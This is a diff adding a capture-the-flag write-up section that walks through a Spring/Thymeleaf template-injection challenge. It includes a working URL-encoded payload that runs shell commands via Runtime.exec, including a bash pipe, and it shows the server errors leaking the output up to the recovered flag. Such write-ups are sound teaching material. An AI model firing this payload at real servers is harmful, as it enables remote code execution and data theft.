@@ -1932,6 +1932,55 @@ change: trees has been changed to ``Thymeleafs''.  We probably have to
 exploit a spring/Thymeleaf vulnerability.  Time to research the
 issues.
 
+Some searching, we find \url{https://www.fatalerrors.org/a/sprboot-thymeleaf-template-injection-for-java-security-development.html} that explains how to inject code into the template engine.  The we need to find a parameter that can be injected, so first check parameter \verb+season+.  When we set it to \verb+xxx+ we get an error message of
+\begin{verbatim}
+{
+    "timestamp": "2021-04-25T14:59:58.208+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-xxx], template might not exist or might not be accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+
+Changing the parameter to execute \verb+whoami+ using \verb+_$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::,x HTTP/1.1+ gives
+\begin{verbatim}
+{
+    "timestamp": "2021-04-25T15:01:02.026+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-seasons], template might not exist or might not be accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+
+The output of the command is \verb+seasons+; we are running as user \verb+seasons+.  Now it is a matter of finding the flag, using \verb+ls+.  The error message only displays the first entry, so it is a bit of a pain, but finally we get an error message that themplate \verb+[page-flag.txt]+ is not known.  Use \verb+cat flag.txt+ to show the contents, unfortunately what we get is
+
+\begin{verbatim}
+
+    "timestamp": "2021-04-25T15:05:08.017+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-well], template might not exist or might not be accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+
+So we have the flag, but only the first word...  First thought: use
+\verb+base64 flag.txt+ to encode the file and get it: the error
+message is
+\verb+d2VsbCBkb25lLCBoZXJlIGlzIHlvdXIgZmxhZzogaGUyMDIxe1NwcjFuZ18xc19teV9mNHZydF9z+
+which decodes to
+\verb+well done, here is your flag: he2021{Spr1ng_1s_my_f4vrt_s+.
+  This corresponds with a base64 string with breaks at position 80.
+  We have to find a way to get the second line as well and for this we
+  probably need a pipe.  This can be created using 
+  \verb+new String[] { "bash", "-c", "base64 flag.txt | tail -1" }+ as
+  an argument to exec.  This returns \verb+page-MzRzbiF9+, and we can
+  construct the whole flag.txt as
+
+  \verb+well done, here is your flag: he2021{Spr1ng_1s_my_f4vrt_s34sn!}+
+  
 
 \hypertarget{he21.35}{%
 \section{HE21.35 The Snake}
